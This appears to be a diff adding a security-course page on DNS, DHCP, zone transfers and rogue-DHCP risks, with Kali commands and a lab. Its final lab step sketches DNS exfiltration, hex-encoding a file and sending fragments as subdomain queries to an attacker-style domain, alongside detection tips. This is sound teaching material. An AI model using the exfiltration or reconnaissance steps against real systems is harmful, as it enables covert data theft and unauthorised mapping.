@@ -1,0 +1,225 @@
+<h1 id="dns-dhcp-and-the-application-layer">DNS, DHCP and the Application Layer</h1>
+<h2 id="summary">Summary</h2>
+<p>Where names become addresses and addresses become configuration. Both protocols are trust-on-first-use<br />
+and both are heavily targeted, because they run before anything is authenticated.</p>
+<h2 id="key-ideas">Key ideas</h2>
+<ul>
+<li><strong>DNS</strong> is UDP/53 (TCP for zone transfers and large answers), hierarchical, and <strong>completely<br />
+  unverified by default</strong></li>
+<li>Record types that matter offensively: <code>A</code>, <code>AAAA</code>, <code>MX</code>, <code>NS</code>, <code>TXT</code>, <code>CNAME</code>, <code>SOA</code>, <code>SRV</code></li>
+<li><strong>DNS zone transfer (AXFR)</strong> on a misconfigured server dumps the entire subdomain map</li>
+<li><strong>DHCP</strong> DORA: Discover, Offer, Request, Acknowledge. Offers a gateway and DNS before<br />
+  authentication exists — the rogue-DHCP and starvation attacks</li>
+<li>The <strong>hosts file</strong> is a local override that bypasses DNS entirely</li>
+<li>TLS, SMTP and HTTP are the app-layer protocols you will meet most</li>
+</ul>
+<h2 id="terminology">Terminology</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Resolver</strong></td>
+<td>The component that answers your DNS queries</td>
+</tr>
+<tr>
+<td><strong>Root / TLD / authoritative</strong></td>
+<td>The three levels of DNS hierarchy</td>
+</tr>
+<tr>
+<td><strong>Zone transfer (AXFR)</strong></td>
+<td>Full zone copy between DNS servers</td>
+</tr>
+<tr>
+<td><strong>Recursion</strong></td>
+<td>Server queries other servers for you</td>
+</tr>
+<tr>
+<td><strong>DORA</strong></td>
+<td>DHCP's four-step exchange</td>
+</tr>
+<tr>
+<td><strong>Rogue DHCP</strong></td>
+<td>An unauthorised server answering clients</td>
+</tr>
+<tr>
+<td><strong>Cache poisoning</strong></td>
+<td>Inserting false records into a resolver's cache</td>
+</tr>
+<tr>
+<td><strong><code>/etc/hosts</code></strong></td>
+<td>Static local name resolution</td>
+</tr>
+<tr>
+<td><strong>SRV record</strong></td>
+<td>Advertises a service host and port</td>
+</tr>
+<tr>
+<td><strong>TXT record</strong></td>
+<td>Free text; abused for SPF, and for data exfiltration</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kali-commands">Kali commands</h2>
+<pre><code class="language-bash"># --- query DNS the way a client does ---
+cat /etc/resolv.conf
+command -v dig nslookup host host
+dig example.com A +short
+dig example.com MX +short
+dig @8.8.8.8 example.com +short
+dig -x 1.1.1.1 +short                    # reverse
+dig example.com ANY +short
+
+# --- the records that map an organisation ---
+dig +short NS example.com
+dig +short MX example.com
+dig +short TXT example.com
+dig +short SRV _ldap._tcp.example.com
+
+# --- try a zone transfer against YOUR OWN lab domain only ---
+dig AXFR lab.local @192.168.56.1 2&gt;&amp;1 | head -20
+# if the server is not authoritative for the zone, it refuses. That refusal is correct.
+
+# --- /etc/hosts, and why it matters ---
+cat /etc/hosts
+getent hosts github.com                  # honours hosts, unlike dig
+getent ahostsv4 github.com | head -3
+
+# --- DHCP: what is on offer on this link ---
+command -v dhclient udhcpc
+sudo dhclient -d -1 2&gt;&amp;1 | head -20
+# lease files:
+ls -la /var/lib/dhcp/ 2&gt;/dev/null
+grep -A6 &quot;lease {&quot; /var/lib/dhcp/dhclient.leases 2&gt;/dev/null | head -12
+
+# --- watch DHCP on your lab link (two terminals) ---
+echo &quot;  T1: sudo tcpdump -i vboxnet0 -n -e port 67 or port 68&quot;
+echo &quot;  T2: sudo dhclient -r vboxnet0 &amp;&amp; sudo dhclient vboxnet0&quot;
+
+# --- passive DNS discovery from the terminal ---
+command -v subfinder amass
+subfinder -silent -d example.com 2&gt;/dev/null | head -10
+</code></pre>
+<h2 id="field-lab">Field lab</h2>
+<p><strong>Objective:</strong> map a domain with DNS, and watch a real DHCP exchange on your lab link.</p>
+<pre><code class="language-bash"># --- PRE-FLIGHT: this lab needs root, so authenticate ONCE, HERE, first ---
+# `sudo something &amp;` backgrounds the password PROMPT along with the command.
+# With no terminal attached to answer it, sudo fails - and `2&gt;/dev/null`
+# then throws away the only clue. The result is a capture file that was
+# never written, followed by a screenful of &quot;no such file&quot;.
+#
+# `sudo -v` validates the credential in the FOREGROUND, where you can see
+# and answer the prompt. It caches for ~15 minutes, so every backgrounded
+# `sudo` below is prompt-free and actually runs.
+if ! sudo -v; then
+  echo &quot;  sudo is unavailable or the password was wrong - stop here.&quot; &gt;&amp;2
+  echo &quot;  Everything below needs root. Nothing will be captured.&quot; &gt;&amp;2
+  exit 1
+fi
+mkdir -p ~/aegis/labs/ccna-07 &amp;&amp; cd ~/aegis/labs/ccna-07
+
+# --- 1. record types that describe an organisation ---
+{
+  echo &quot;=== my resolver config ===&quot;; cat /etc/resolv.conf | grep -v '^#'
+  echo
+  for t in NS MX TXT SOA A; do
+    echo &quot;=== $t records for github.com ===&quot;
+    dig +short $t github.com 2&gt;/dev/null | head -5
+  done
+  echo &quot;=== SRV records (service location) ===&quot;
+  dig +short SRV _sip._udp.github.com 2&gt;/dev/null | head -3
+} 2&gt;&amp;1 | tee 01-dns.txt
+
+# --- 2. the hosts file beats DNS (and that is an attack surface) ---
+{
+  echo &quot;=== getent vs dig: getent honours /etc/hosts ===&quot;
+  echo &quot;  getent hosts github.com : $(getent hosts github.com | head -1)&quot;
+  echo &quot;  dig +short github.com    : $(dig +short github.com 2&gt;/dev/null | head -1)&quot;
+  echo
+  echo &quot;=== /etc/hosts on this machine ===&quot;
+  cat /etc/hosts
+  echo
+  echo &quot;Anyone who can write /etc/hosts can redirect any name on this host.&quot;
+  ls -la /etc/hosts
+} 2&gt;&amp;1 | tee 02-hosts.txt
+
+# --- 3. attempt a zone transfer against your own lab domain ---
+{
+  echo &quot;=== AXFR attempt (authorised lab targets only) ===&quot;
+  echo &quot;--- against a domain this host does not serve (correct refusal expected) ---&quot;
+  dig AXFR example.com @127.0.0.1 2&gt;&amp;1 | grep -E &quot;status:|Transfer failed&quot; | head -3
+  echo
+  echo &quot;If you run your own DNS server for the lab, this returns EVERY host:&quot;
+  echo &quot;  dig AXFR lab.local @192.168.56.1&quot;
+} 2&gt;&amp;1 | tee 03-axfr.txt
+
+# --- 4. a real DHCP exchange on the lab link ---
+if ip -br addr show vboxnet0 &gt;/dev/null 2&gt;&amp;1; then
+  sudo timeout 15 tcpdump -i vboxnet0 -n -e &quot;udp port 67 or udp port 68&quot; 2&gt;/dev/null \
+     &gt; 04-dhcp.txt &amp;
+  TC=$!
+  sleep 1
+  sudo dhclient -r vboxnet0 &gt;/dev/null 2&gt;&amp;1
+  sleep 1
+  sudo dhclient vboxnet0 &gt;/dev/null 2&gt;&amp;1 &amp;
+  sleep 8
+  kill $TC 2&gt;/dev/null; wait $TC 2&gt;/dev/null
+  echo &quot;=== the DHCP exchange ===&quot;
+  grep -E &quot;BOOTREQUEST|BOOTREPLY&quot; 04-dhcp.txt | head -8
+  echo
+  cat &lt;&lt;'EOF'
+  DORA:
+    Discover  client -&gt; broadcast, &quot;is there a DHCP server?&quot;
+    Offer     server  -&gt; &quot;here is an address, gateway, DNS, lease time&quot;
+    Request   client  -&gt; &quot;I accept that offer&quot;  &lt;- the vulnerable step
+    Ack       server  -&gt; &quot;confirmed&quot;
+
+  The Request is broadcast and unauthenticated. A rogue server that answers
+  first becomes the client's gateway and DNS: full man-in-the-middle position.
+EOF
+  echo
+  echo &quot;=== what my lease actually says ===&quot;
+  grep -A8 &quot;lease {&quot; /var/lib/dhcp/dhclient.leases 2&gt;/dev/null | tail -12
+else
+  echo &quot;No vboxnet0 - build the lab (docs/LAB-SETUP.md) to capture DHCP.&quot; | tee 04-dhcp.txt
+fi
+
+# --- 5. why DNS is a covert channel ---
+cat &gt; 05-dns-exfil.md &lt;&lt;'EOF'
+# DNS as a covert channel
+
+Because DNS is required before almost anything else works, DNS traffic is permitted nearly
+everywhere and inspected rarely.
+
+Shape:   data.&lt;hex-payload&gt;.attacker-domain.com
+Each subquery carries a few bytes; a cooperating server reassembles the stream.
+
+**Authorised-lab-only exercise:** build it against a domain you control.
+
+1. Encode:    xxd -p secret.txt | fold -w 30
+2. Exfil:     dig +short b64fragment.yourdomain.com
+3. Detect:    look for high-entropy subdomains in resolver logs
+   sudo journalctl -u systemd-resolved | grep -oE '[a-f0-9]{20,}' | head
+
+Defence: log all DNS, alert on volume and subdomain entropy, restrict egress to your resolver.
+EOF
+cat 05-dns-exfil.md
+</code></pre>
+<p><strong>Step 4 is the one worth performing.</strong> Watching a real DORA exchange shows you that the client<br />
+broadcasts a <em>request</em> accepting an offer — which is the exact reason rogue DHCP works.</p>
+<p><strong>Record:</strong> <code>01-dns.txt</code> and <code>05-dns-exfil.md</code>.</p>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>What does a zone transfer dump, and why is it such a common finding?</li>
+<li>Name the four DHCP steps and say which one is unauthenticated.</li>
+<li>Why can <code>getent hosts</code> disagree with <code>dig</code>?</li>
+<li>What records would you query to map an organisation's mail infrastructure?</li>
+<li>Why is DNS a good covert channel, and what is the primary defence?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>DNS</strong> → <strong>DNS Zone Transfer</strong> → <strong>DNS Reconnaissance</strong> → <strong>DHCP</strong> → <strong>DHCP Starvation</strong> →<br />
+<strong>DNS Rebinding</strong>.</p>
